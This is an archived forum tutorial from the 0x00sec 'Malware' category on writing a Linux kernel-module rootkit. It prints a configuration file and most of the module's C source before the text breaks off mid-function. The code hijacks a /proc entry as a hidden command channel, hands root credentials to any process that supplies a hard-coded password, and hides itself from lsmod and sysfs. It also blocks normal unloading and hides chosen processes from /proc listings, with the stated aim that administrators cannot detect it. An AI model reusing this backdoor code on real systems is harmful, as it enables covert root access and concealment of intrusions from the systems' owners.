@@ -1,0 +1,1113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Writing a simple rootkit for linux - Malware - 0x00sec - The Home of the Hacker</title>
+<meta name="description" content="WRITING A SIMPLE ROOTKIT FOR LINUX
+In this article, I’ll describe how to write a simple rootkit for linux. However, to understand this article, you must know how to write 
+linux kernel modules. If you don’t know, you ca&amp;hellip;">
+<meta name="generator" content="Discourse 3.1.0.beta6 - https://github.com/discourse/discourse version 80a1709965fa59da824b2e3392976fc6fc898f80">
+<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.png">
+<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.png">
+<meta name="theme-color" media="all" content="#171616">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=yes, viewport-fit=cover">
+<link rel="canonical" href="29034.html" />
+<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">
+<link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_a5ef387651921c3e4c7aa1108536015ba8299efb.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" class="light-scheme" />
+<link href="../../stylesheets/desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop" />
+<link href="../../stylesheets/chat_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat" />
+<link href="../../stylesheets/discourse-details_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-details" />
+<link href="../../stylesheets/discourse-lazy-videos_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-lazy-videos" />
+<link href="../../stylesheets/discourse-local-dates_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-local-dates" />
+<link href="../../stylesheets/discourse-narrative-bot_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-narrative-bot" />
+<link href="../../stylesheets/discourse-presence_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-presence" />
+<link href="../../stylesheets/discourse-spoiler-alert_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-spoiler-alert" />
+<link href="../../stylesheets/docker_manager_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="docker_manager" />
+<link href="../../stylesheets/poll_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll" />
+<link href="../../stylesheets/chat_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat_desktop" />
+<link href="../../stylesheets/poll_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll_desktop" />
+<link href="../../stylesheets/desktop_theme_46_f36ade55bf80933494fe3b5fab518f477de3bd4e.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2" />
+<link href="../../stylesheets/desktop_theme_57_8c0e890a61cdb4c5833a9f9c96664ed164e7d645.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="57" data-theme-name="0x00sec-v2" />
+<link rel="stylesheet" href="https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
+<script src="https://s3.amazonaws.com/0x00sec/highlight.pack.js"></script>
+<link rel="preload" href="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" as="script">
+<script defer src="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" data-theme-id="40"></script>
+<link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;Writing a simple rootkit for linux&#39;" href="29034.rss" />
+<meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://0x00sec.org/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
+<meta property="og:image" content="https://0x00sec.org/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
+<meta property="og:url" content="https://0x00sec.org/t/writing-a-simple-rootkit-for-linux/29034" />
+<meta name="twitter:url" content="https://0x00sec.org/t/writing-a-simple-rootkit-for-linux/29034" />
+<meta property="og:title" content="Writing a simple rootkit for linux" />
+<meta name="twitter:title" content="Writing a simple rootkit for linux" />
+<meta property="og:description" content="WRITING A SIMPLE ROOTKIT FOR LINUX In this article, I’ll describe how to write a simple rootkit for linux. However, to understand this article, you must know how to write  linux kernel modules. If you don’t know, you can read Kernel modules — The Linux Kernel documentation  What is a rootkit? When you break into sb’s system you will probably want to be able to “come back” there after some time. When you install  a rootkit in that system you will be able to get administrator privileges whenever ..." />
+<meta name="twitter:description" content="WRITING A SIMPLE ROOTKIT FOR LINUX In this article, I’ll describe how to write a simple rootkit for linux. However, to understand this article, you must know how to write  linux kernel modules. If you don’t know, you can read Kernel modules — The Linux Kernel documentation  What is a rootkit? When you break into sb’s system you will probably want to be able to “come back” there after some time. When you install  a rootkit in that system you will be able to get administrator privileges whenever ..." />
+<meta property="og:article:section" content="Malware" />
+<meta property="og:article:section:color" content="F7941D" />
+<meta property="og:article:tag" content="malware" />
+<meta property="og:article:tag" content="hacking" />
+<meta name="twitter:label1" value="Reading time" />
+<meta name="twitter:data1" value="8 mins 🕑" />
+<meta name="twitter:label2" value="Likes" />
+<meta name="twitter:data2" value="24 ❤" />
+<meta property="article:published_time" content="2022-04-16T00:19:52+00:00" />
+<meta property="og:ignore_canonical" content="true" />
+</head>
+<body class="crawler ">
+<div id="top-navbar" class="container">
+<span id="top-navbar-links" style="display:none;">
+
+<a href="https://init.0x00sec.org" class="dow-menu">Init</a>
+<a href="https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
+<a href="https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
+</span>
+</div>
+<header>
+<a href="../../index.html">
+0x00sec - The Home of the Hacker
+</a>
+</header>
+<div id="main-outlet" class="wrap" role="main">
+<div id="topic-title">
+<h1>
+<a href="29034.html">Writing a simple rootkit for linux</a>
+</h1>
+<div class="topic-category" itemscope itemtype="http://schema.org/BreadcrumbList">
+<span itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
+<a href="../../c/malware.html" class="badge-wrapper bullet" itemprop="item">
+<span class="badge-category-bg" style="background-color: #F7941D"></span>
+<span class="badge-category clear-badge">
+<span class="category-name" itemprop="name">Malware</span>
+</span>
+</a>
+<meta itemprop="position" content="1" />
+</span>
+</div>
+<div class="topic-category">
+<div class="discourse-tags list-tags">
+<a href="../../tag/malware.html" class="discourse-tag" rel="tag">malware</a>,
+<a href="../../tag/hacking.html" class="discourse-tag" rel="tag">hacking</a>
+</div>
+</div>
+</div>
+<div itemscope itemtype="http://schema.org/DiscussionForumPosting">
+<meta itemprop="headline" content="Writing a simple rootkit for linux">
+<meta itemprop="articleSection" content="Malware">
+<meta itemprop="keywords" content="malware, hacking">
+<div itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+<meta itemprop="name" content="0x00sec - The Home of the Hacker">
+<div itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+<meta itemprop="url" content="https://0x00sec.org/uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.png">
+</div>
+</div>
+<div id="post_1" class="topic-body crawler-post">
+<div class="crawler-post-meta">
+<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
+<a itemprop="url" href="https://0x00sec.org/u/0xf00"><span itemprop="name">0xf00</span></a>
+</span>
+<link itemprop="mainEntityOfPage" href="29034.html">
+<span class="crawler-post-infos">
+<time itemprop="datePublished" datetime="2022-04-16T00:19:52Z" class="post-time">
+April 16, 2022, 12:19am
+</time>
+<meta itemprop="dateModified" content="2022-04-16T17:59:16Z">
+<span itemprop="position">1</span>
+</span>
+</div>
+<div class="post" itemprop="articleBody">
+<h1>
+<a name="writing-a-simple-rootkit-for-linux-1" class="anchor" href="29034.html#writing-a-simple-rootkit-for-linux-1"></a>WRITING A SIMPLE ROOTKIT FOR LINUX</h1>
+<p>In this article, I’ll describe how to write a simple rootkit for linux. However, to understand this article, you must know how to write<br>
+linux kernel modules. If you don’t know, you can read <a href="https://linux-kernel-labs.github.io/refs/heads/master/labs/kernel_modules.html" class="inline-onebox" rel="noopener nofollow ugc">Kernel modules — The Linux Kernel documentation</a></p>
+<p>What is a rootkit? When you break into sb’s system you will probably want to be able to “come back” there after some time. When you install<br>
+a rootkit in that system you will be able to get administrator privileges whenever you want. Good rootkits can hide in compromised system,<br>
+so that they can’t be found by administrator. There are many ways to hide in a system. I’m not going to describe all of them <img src="../../images/emoji/twitter/slight_smile.png%3Fv=12" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
+<p>In this article we are talking only about linux rootkits.<br>
+There are some main types of rootkits for linux.<br>
+For example there are rootkits that replace some most important programs in system(ls, ps, netstat etc.) with modified versions of them that<br>
+won’t let administrator see that something’s wrong. Although, such a rootkit is quite easy to detect.<br>
+Other rootkits work as linux kernel modules. They work in kernel mode, so they can do everything they want. They can hide themselves, files,<br>
+processes etc. In this tutorial we are talking about this type of rootkits.</p>
+<p>Please, notice that it is not “true” rootkit. To use its features like getting root privileges you must have local acces to system with<br>
+installed rootkit. It can be “normal” user account, but you must be able to log to that account. For addition when system with installed rootkit<br>
+reboots, our rootkit will be “uninstalled” because it is not loaded at the boot time. But this article is not meant to give script kiddies<br>
+true rootkit which they will be able to use. This article only has to teach you basics of programming rootkits.</p>
+<p>At first, I will describe generally how this rootkit works, then I will show its code and finally I will write in details how it works.<br>
+So, let’s go:</p>
+<ol>
+<li>I will start with describing what features it will have.
+<ul>
+<li>When users “sends” correct command to the rootkit, he will get root privileges.</li>
+<li>Another command will let user to hide a process</li>
+<li>To make possible to unload rootkit safely(without any Oops or errors) it will have functions which will make rootkit visible etc. I will describe them soon.</li>
+<li>Another function will let user to “unhide” lastly hidden process.</li>
+</ul>
+</li>
+<li>Let’s see what functions will be called during loading the rootkit:
+<ul>
+<li>module_remember_info() - this functions saves some information about rootkit to make possible to unload it later.</li>
+<li>proc_init() - this is very important function which make possible to “send” command to rootkit.</li>
+<li>module_hide() - in this function we hide the rootkit</li>
+<li>tidy() - in this function we do some clean up. If we don’t do this, there will be some errors during unloading the rootkit.</li>
+<li>rootkit_protect() - this is very simple function which just makes impossible to unload the rootkit by “rmmod rootkit” command<br>
+even if it is visible. However it is still possible to unload by “rmmod -f rootkit” if kernel wa was compiled with support<br>
+for forced unloading modules.</li>
+</ul>
+</li>
+<li>Now, I will describe those functions in details:</li>
+</ol>
+<ul>
+<li>proc_init():
+<ul>
+<li>As already mentioned, this function makes possible to send command to the rootkit. Firstly, I wanted to create an entry in proc<br>
+and then hide it so that it’s not possible to find it by “readdir” syscall. But it’s not good idea. It was still possible to find rootkit<br>
+from kernel mode by browsing list of entries in proc. So, what did I do? The rootkit finds an existing entry(for example /proc/version)<br>
+and replaces its existing functions(like read_proc and write_proc) with other functions. Commands are sent to rootkit by writing or reading<br>
+from “infected” entry. You can ask: “So by reading or writing? Or both?”. It depends on what functions had infected entry.<br>
+If it had only writing function, we replace it. Why not to create function for reading? Because it would be suspicious if entry<br>
+suddenly gets funtion for writing. We have to avoid it - administrator cannot detect us! If entry had only reading function, we replace it.<br>
+If it had both, reading and writing functions, we replace only writing function.<br>
+So, how to pass commands to that entry? When writing function was replaced you have to just write to that entry correct command. You can do this<br>
+using echo or similar programs. However, if you want to get root privileges, you must write your own program which writes to that entry and then<br>
+using execve syscall runs shell.<br>
+If reading function was replaced, you must write special program. What does it have to do? It must read from that entry using read syscall.<br>
+One of parameters of this function is pointer to buffer where data has to be written. To pass command to our entry, you must save that command<br>
+in a buffer. Then, you give pointer to that buffer as parameter of read syscall.<br>
+Later I will show code of example program which can be used for passing command to the rootkit.<br>
+Let’s move to next function.</li>
+</ul>
+</li>
+<li>rootkit_hide():
+<ul>
+<li>In this function we hide the rootkit. First problem is that rootkit is displayed by “lsmod” command and is visible in /proc/modules file.<br>
+To solve this problem we can delete our module from main list of modules. Each module is represented by module structure. Let’s take a look at a definition of this structure:</li>
+</ul>
+</li>
+</ul>
+<pre><code class="lang-auto">struct module
+{
+        enum module_state state;
+
+        /* Member of list of modules */
+        struct list_head list;
+
+        /* Unique handle for this module */
+        char name[MODULE_NAME_LEN];
+
+        /* Sysfs stuff. */
+        struct module_kobject mkobj;
+        struct module_attribute *modinfo_attrs;
+        const char *version;
+        const char *srcversion;
+        struct kobject *holders_dir;
+
+        /* Exported symbols */
+        const struct kernel_symbol *syms;
+        const unsigned long *crcs;
+        unsigned int num_syms;
+
+        /* Kernel parameters. */
+        struct kernel_param *kp;
+        unsigned int num_kp;
+
+        /* GPL-only exported symbols. */
+        unsigned int num_gpl_syms;
+        const struct kernel_symbol *gpl_syms;
+        const unsigned long *gpl_crcs;
+
+#ifdef CONFIG_UNUSED_SYMBOLS
+        /* unused exported symbols. */
+        const struct kernel_symbol *unused_syms;
+        const unsigned long *unused_crcs;
+        unsigned int num_unused_syms;
+
+        /* GPL-only, unused exported symbols. */
+        unsigned int num_unused_gpl_syms;
+        const struct kernel_symbol *unused_gpl_syms;
+        const unsigned long *unused_gpl_crcs;
+#endif
+
+        /* symbols that will be GPL-only in the near future. */
+        const struct kernel_symbol *gpl_future_syms;
+        const unsigned long *gpl_future_crcs;
+        unsigned int num_gpl_future_syms;
+
+        /* Exception table */
+        unsigned int num_exentries;
+        struct exception_table_entry *extable;
+
+        /* Startup function. */
+        int (*init)(void);
+
+        /* If this is non-NULL, vfree after init() returns */
+        void *module_init;
+
+        /* Here is the actual code + data, vfree'd on unload. */
+        void *module_core;
+
+        /* Here are the sizes of the init and core sections */
+        unsigned int init_size, core_size;
+
+        /* The size of the executable code in each section.  */
+        unsigned int init_text_size, core_text_size;
+
+        /* Arch-specific module values */
+        struct mod_arch_specific arch;
+
+        unsigned int taints;    /* same bits as kernel:tainted */
+
+#ifdef CONFIG_GENERIC_BUG
+        /* Support for BUG */
+        unsigned num_bugs;
+        struct list_head bug_list;
+        struct bug_entry *bug_table;
+#endif
+
+#ifdef CONFIG_KALLSYMS
+        /* We keep the symbol and string tables for kallsyms. */
+        Elf_Sym *symtab;
+        unsigned int num_symtab;
+        char *strtab;
+
+        /* Section attributes */
+        struct module_sect_attrs *sect_attrs;
+
+        /* Notes attributes */
+        struct module_notes_attrs *notes_attrs;
+#endif
+
+        /* Per-cpu data. */
+        void *percpu;
+
+        /* The command line arguments (may be mangled).  People like
+           keeping pointers to this stuff */
+        char *args;
+#ifdef CONFIG_MARKERS
+        struct marker *markers;
+        unsigned int num_markers;
+#endif
+#ifdef CONFIG_TRACEPOINTS
+        struct tracepoint *tracepoints;
+        unsigned int num_tracepoints;
+#endif
+
+#ifdef CONFIG_TRACING
+        const char **trace_bprintk_fmt_start;
+        unsigned int num_trace_bprintk_fmt;
+#endif
+
+#ifdef CONFIG_MODULE_UNLOAD
+        /* What modules depend on me? */
+        struct list_head modules_which_use_me;
+
+        /* Who is waiting for us to be unloaded */
+        struct task_struct *waiter;
+
+        /* Destruction function. */
+        void (*exit)(void);
+
+#ifdef CONFIG_SMP
+        char *refptr;
+#else
+        local_t ref;
+#endif
+#endif
+</code></pre>
+<p>struct list_head list - this is the main list of modules. We have to delete our module from this list.<br>
+When we do this, rootkit will no longer be visible by “lsmod” and in “/proc/modules”. But our rootkit is still visible in /sys/module/ directory. /sys is also special filesystem(like /proc).<br>
+Each entry in /sys is represented by kobject structure. Each module has its own kobject. In definition of struct module we see:<br>
+struct module_kobject mkobj<br>
+Let’s look at definition of module_kobject structure:</p>
+<pre><code class="lang-auto">struct module_kobject
+{
+        struct kobject kobj;
+        struct module *mod;
+        struct kobject *drivers_dir;
+        struct module_param_attrs *mp;
+};
+</code></pre>
+<p>Most important for us is</p>
+<ul>
+<li>struct kobject kobj</li>
+<li>kobj represents our module in /sys/module/ directory.<br>
+Let’s look at definition os kobject structure.</li>
+</ul>
+<pre><code class="lang-auto">struct kobject {
+        const char              *name;
+        struct list_head        entry;
+        struct kobject          *parent;
+        struct kset             *kset;
+        struct kobj_type        *ktype;
+        struct sysfs_dirent     *sd;
+        struct kref             kref;
+        unsigned int state_initialized:1;
+        unsigned int state_in_sysfs:1;
+        unsigned int state_add_uevent_sent:1;
+        unsigned int state_remove_uevent_sent:1;
+        unsigned int uevent_suppress:1;
+};
+</code></pre>
+<p>We see:</p>
+<pre><code class="lang-auto">struct list_head entry; 
+</code></pre>
+<p>This is list of kobjects. At first, we must delete our module from /sys/modules by kobject_del() function and then we must delete our kobject from “entry” list. Let’s talk about next function</p>
+<h2>
+<a name="tidy-2" class="anchor" href="29034.html#tidy-2"></a>tidy():</h2>
+<ul>
+<li>When you analyse what kernel does during unloading a module you will see that it deletes entry in /sys/module for that module.<br>
+But there’s a problem - we removed that entry. So when we unload a module the kernel will try to remove non-existing entry. This will cause<br>
+Oops and probably the system will crash. We must avoid it. But you can see that when we set some pointers to NULL, the kernel won’t try<br>
+to remove that entry. If you want to really understand this function you must browse linux kernel’s source code on your own. Writing<br>
+about process of loading and unloading modules could be bigger than 7 articles like this you are currently reading <img src="../../images/emoji/twitter/wink.png%3Fv=12" title=":wink:" class="emoji" alt=":wink:">
+</li>
+</ul>
+<h2>
+<a name="rootkit_protect-3" class="anchor" href="29034.html#rootkit_protect-3"></a>rootkit_protect():</h2>
+<ul>
+<li>
+<p>Very simple function. It just calls try_module_get function, giving pointer to current module as parameter.<br>
+try_module_get increases counter of references to the module. As a result, module cannot be unloaded by normal “rmmod” command.<br>
+However, as already mentioned, if kernel was compiled with support for forced modules unloading, module still can be unloaded<br>
+by “rmmod -f” command.</p>
+</li>
+<li>
+<p>To list running processes from user mode, programs list content of /proc. Each process has its own directory there. Name of that directory<br>
+is this process’ PID. Notice that proc_dir_entry has pointer to file_operations structure.<br>
+This structure defines operations on a file. In this situation on entry in /proc. Let’s look at definition of this structure:</p>
+</li>
+</ul>
+<pre><code class="lang-auto">struct file_operations {
+        struct module *owner;
+        loff_t (*llseek) (struct file *, loff_t, int);
+        ssize_t (*read) (struct file *, char __user *, size_t, loff_t *);
+        ssize_t (*write) (struct file *, const char __user *, size_t, loff_t *);
+        ssize_t (*aio_read) (struct kiocb *, const struct iovec *, unsigned long, loff_t);
+        ssize_t (*aio_write) (struct kiocb *, const struct iovec *, unsigned long, loff_t);
+        int (*readdir) (struct file *, void *, filldir_t);
+        unsigned int (*poll) (struct file *, struct poll_table_struct *);
+        int (*ioctl) (struct inode *, struct file *, unsigned int, unsigned long);
+        long (*unlocked_ioctl) (struct file *, unsigned int, unsigned long);
+        long (*compat_ioctl) (struct file *, unsigned int, unsigned long);
+        int (*mmap) (struct file *, struct vm_area_struct *);
+        int (*open) (struct inode *, struct file *);
+        int (*flush) (struct file *, fl_owner_t id);
+        int (*release) (struct inode *, struct file *);
+        int (*fsync) (struct file *, struct dentry *, int datasync);
+        int (*aio_fsync) (struct kiocb *, int datasync);
+        int (*fasync) (int, struct file *, int);
+        int (*lock) (struct file *, int, struct file_lock *);
+        ssize_t (*sendpage) (struct file *, struct page *, int, size_t, loff_t *, int);
+        unsigned long (*get_unmapped_area)(struct file *, unsigned long, unsigned long, unsigned long, unsigned long);
+        int (*check_flags)(int);
+        int (*flock) (struct file *, int, struct file_lock *);
+        ssize_t (*splice_write)(struct pipe_inode_info *, struct file *, loff_t *, size_t, unsigned int);
+        ssize_t (*splice_read)(struct file *, loff_t *, struct pipe_inode_info *, size_t, unsigned int);
+        int (*setlease)(struct file *, long, struct file_lock **);
+</code></pre>
+<h3>
+<a name="important-fields-for-us-are-read-write-and-readdir-4" class="anchor" href="29034.html#important-fields-for-us-are-read-write-and-readdir-4"></a>Important fields for us are: read, write and readdir.</h3>
+<ul>
+<li>readdir this function is used to list content of a directory. How do we hide a process? We store pid’s of hidden processes in “pid” buffer.<br>
+We find proc_dir_entry for /proc. Then we replace its readdir function in file_operations with our own. This function normally lists content of /proc, but omits directories representing hidden processes. How does readdir fuction work? It just goes through elements in a directory, but there is one interesting thing. It doesn’t write data connected with directory’s content anywhere directly but uses filldir function(given as a parameter) to do this. filldir_t filldir - this is pointer to filldir function which has to be used by readdir function. Let’s look at the prototype:</li>
+</ul>
+<pre><code class="lang-auto">static int filldir(void * __buf, const char * name, int namlen, loff_t offset,
+                   u64 ino, unsigned int d_type)
+</code></pre>
+<h3>
+<a name="for-example-5" class="anchor" href="29034.html#for-example-5"></a>For example:</h3>
+<ul>
+<li>readdir function for /proc directory lists its content. It goes through all elements. For each element it invokes filldir as “name” parameter giving name of current element. So, If programs list content of /proc to see what processes run in the system and readdir function from file_operations structure is used to list content of a directory, we can modify readdir of /proc so that it won’t display processes we want to hide! We just set “readdir” pointer in /proc’s file_operations structure to our version of readdir. Our readdir just invokes original readdir but as its “filldir” parameter gives ointer to our filldir function. What does our filldir do? It checks if “name” parameter is equal to pid of one of hidden processes. If it is, it just doesn’t display it. Otherwise, it invokes original filldir function. Another thing I have to explain is connected with replacing reading and writing functions. There are two possiblities to “define” reading and writing functions for entry in /proc. You can give pointer to your function in proc_read/proc_write field or give pointer to your function in entry’s file_operations structure’s read/write fields. When we infect entry we set proc_read/proc_write pointer to our function, if it was originally set and we set read/write field of file_operations if it was set. How to change user’s privileges to root privileges? We must change uid, euid, gid and egid of current process to 0. Each process is represented by task_struct structure. It’s quite complex structure and I won’t show its definition here. uid, gid and other similar “things” are stored in cred structure which is element of task_struct. To change value of this fields we have to invoke prepare_creds() function which returns pointer to struct cred with uid, gid etc. set to values equal to values of uid, gid etc. in current process’ cred structure. Then, we can modify all fields of this structure. Finally we invoke commit_creds() function, giving pointer to our struct cred as parameter. How do we find entry which has to be infected? Entries in /proc are organised in form of a list - proc_dir_entry has field “next” which is pointer to next entry in current directory. Each directory in /proc has “subdir” field, which is pointer to first entry in that directory. So how do we locate entry we want to infect? At first we set pointer to /proc directory. Let’s name this pointer “ptr”. Then we set it to ptr-&gt;subdir. After that we compare name of entry which is pointed by ptr with name of entry we want to infect. If it is equal, we found our entry. Otherwise we go to ptr-&gt;next and compare its name with entry to infect etc. All commands and other important things are configured in rootkit_conf.conf.h configuration file.</li>
+</ul>
+<ol start="5">
+<li>It’s time to show code of our rootkit. If I haven’t explained something yet, I will describe it as comments in the code.</li>
+</ol>
+<ul>
+<li>At first, rootkit_conf.conf.h.<br>
+<strong>Config file!</strong>
+</li>
+</ul>
+<pre><code class="lang-auto">static char password[] = "secretpassword" ; //give here password
+static char passwaiter[] = "version" ; //here is name of entry to infect in /proc - you pass commands to it 
+static char module_release[] = "release" ; //command to release the module(make possible to unload it)
+static char module_uncover[] = "uncover" ; //command to show the module
+static char hide_proc[] = "hide" ; //command to hide specified process
+static char unhide_proc[] = "unhide"; //command to "unhide" last hidden process
+</code></pre>
+<p>rootkit.c:</p>
+<pre><code class="lang-auto">#include &lt;linux/module.h&gt;
+#include &lt;linux/kernel.h&gt;
+#include &lt;linux/proc_fs.h&gt;
+#include &lt;linux/sched.h&gt;
+#include &lt;linux/string.h&gt;
+#include &lt;linux/cred.h&gt;
+#include &lt;linux/stat.h&gt;
+#include &lt;linux/uaccess.h&gt;
+#include &lt;linux/file.h&gt;
+
+#include "rootkit_conf.conf.h"
+
+MODULE_LICENSE("GPL") ;
+MODULE_AUTHOR("Ormi&lt;<a href="../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="711e031c185f1e031c1831161c10181d5f121e1c">[email&#160;protected]</a>&gt;") ;
+MODULE_DESCRIPTION("Simple rootkit using procfs") ;
+MODULE_VERSION("0.1.2");
+
+static int failed;
+static char pid[10][32];
+static int pid_index;
+
+/* Here are pointers in which we save original, replaced pointers. We use them later, during unloading the module.
+I think that their names explain what they are ;) */
+static int (*old_proc_readdir)(struct file *, void *, filldir_t);
+static filldir_t old_filldir ;
+static ssize_t (*old_fops_write) (struct file *, const char __user *,
+size_t, loff_t *);
+static ssize_t (*old_fops_read)(struct file *, char __user *, size_t, loff_t *);
+static write_proc_t *old_write;
+static read_proc_t *old_read;
+
+static struct proc_dir_entry *ptr; /* Pointer to "infected" entry */
+static struct proc_dir_entry *root; /* Pointer to /proc directory */
+static struct list_head *prev; /* Pointer to entry in main modules list which was before our module before we hid the rootkit */
+
+static struct file_operations *fops; /* file_operations of infected entry */
+static struct file_operations *root_fops; /* file_operations of /proc directory */
+
+static inline void module_remember_info(void)
+{
+	prev = THIS_MODULE-&gt;list.prev;
+}
+
+static inline void module_show(void)
+{
+	list_add(&amp;THIS_MODULE-&gt;list, prev); /* We add our module to main list of modules */
+}
+
+/* Parameter of this function is pointer to buffer in which there should be command */
+static int check_buf(const char __user *buf)
+{
+	/* Here we give root privileges */
+	struct cred *new = prepare_creds();
+	if (!strcmp(buf, password)) {
+		new-&gt;uid = new-&gt;euid = 0;
+		new-&gt;gid = new-&gt;egid = 0;
+		commit_creds(new);
+	}
+
+	/* Here we make possible to unload the module by "rmmod" */
+	else if (!strcmp(buf, module_release))
+		module_put(THIS_MODULE);
+	/* Here we make module visible */
+	else if (!strcmp(buf, module_uncover))
+		module_show();
+	/* We hide process */
+	else if (!strncmp(buf, hide_proc, strlen(hide_proc))) {
+		if (pid_index &gt; 9)
+			return 0;
+		sprintf(pid[pid_index], "%s", buf + 5);
+		pid_index++;
+	}
+	/* We "unhide" lastly hidden process */
+	else if (!strncmp(buf, unhide_proc, strlen(unhide_proc))) {
+		if (!pid_index)
+			return 0;
+		pid_index--;
+	}
+	/* If we are here, there was no command passed */
+	else
+		return 1;
+	return 0;
+}
+
+/* Our "write" function */
+static int buf_write(struct file *file, const char __user *buf,
+unsigned long count, void *data)
+{
+	/* If check_buf return 0, there was command passed */	
+	if (!check_buf(buf))
+		return count;
+	/* Otherwise we execute original function */
+	return old_write(file, buf, count, data);
+}
+
+/* Our "read" function  for read_proc field*/
+static int buf_read(char __user *buf, char **start, off_t off,
+int count, int *eof, void *data)
+{
+	if (!check_buf(buf))
+		return count;
+	return old_read(buf, start, off, count, eof, data);
+}
+
+/* For file_operations structure */
+static ssize_t fops_write(struct file *file, const char __user *buf_user,
+size_t count, loff_t *p)
+{
+	if (!check_buf(buf_user))
+		return count;
+	return old_fops_write(file, buf_user, count, p);
+}
+
+/* For file_operations structure */
+static ssize_t fops_read(struct file *file, char __user *buf_user,
+size_t count, loff_t *p)
+{
+	if (!check_buf(buf_user))
+		return count;
+	return old_fops_read(file, buf_user, count, p);
+}
+
+/* Our filldir function */
+static int new_filldir(void *__buf, const char *name, int namelen,
+loff_t offset, u64 ino, unsigned d_type)
+{
+	int i;
+	/* We check if "name" is pid of one of hidden processes */
+	for (i = 0; i &lt; pid_index; i++)
+		if (!strcmp(name, pid[i]))
+			return 0; /* If yes, we don't display it */
+	/* Otherwise we invoke original filldir */
+	return old_filldir(__buf, name, namelen, offset, ino, d_type);
+}
+
+/* Our readdir function */
+static int new_proc_readdir(struct file *filp, void *dirent, filldir_t filldir)
+{
+	/* To invoke original filldir in new_filldir we have to remeber pointer to original filldir */	
+	old_filldir = filldir;
+	/* We invoke original readdir, but as "filldir" parameter we give pointer to our filldir */
+	return old_proc_readdir(filp, dirent, new_filldir) ;
+}
+
+/* Here we replace readdir function of /proc */
+static inline void change_proc_root_readdir(void)
+{
+	root_fops = (struct file_operations *)root-&gt;proc_fops;
+	old_proc_readdir = root_fops-&gt;readdir;
+	root_fops-&gt;readdir = new_proc_readdir;
+}
+
+static inline void proc_init(void)
+{
+
+	ptr = create_proc_entry("temporary", 0444, NULL);
+	ptr = ptr-&gt;parent;
+	/* ptr-&gt;parent was pointer to /proc directory */
+	/* If it wasn't, something is seriously wrong */
+	if (strcmp(ptr-&gt;name, "/proc") != 0) {
+		failed = 1;
+		return;
+	}
+	root = ptr;
+	remove_proc_entry("temporary", NULL);
+	change_proc_root_readdir(); /* We change /proc's readdir function */
+	ptr = ptr-&gt;subdir;
+	/* Now we are searching entry we want to infect */
+	while (ptr) {
+		if (strcmp(ptr-&gt;name, passwaiter) == 0)
+			goto found; /* Ok, we found it */
+		ptr = ptr-&gt;next; /* Otherwise we go to next entry */ 
+	}
+	/* If we didn't find it, something is wrong :( */
+	failed = 1;
+	return;
+found:
+	/* Let's begin infecting */
+	/* We save pointers to original reading and writing functions, to restore them during unloading the rootkit */
+	old_write = ptr-&gt;write_proc;
+	old_read = ptr-&gt;read_proc;
+
+	fops = (struct file_operations *)ptr-&gt;proc_fops; /* Pointer to file_operations structure of infected entry */
+	old_fops_read = fops-&gt;read;
+	old_fops_write = fops-&gt;write;
+
+	/* We replace write_proc/read_proc */
+	if (ptr-&gt;write_proc)
+		ptr-&gt;write_proc = buf_write;
+	else if (ptr-&gt;read_proc)
+		ptr-&gt;read_proc = buf_read;
+	/* We replace read/write from file_operations */
+	if (fops-&gt;write)
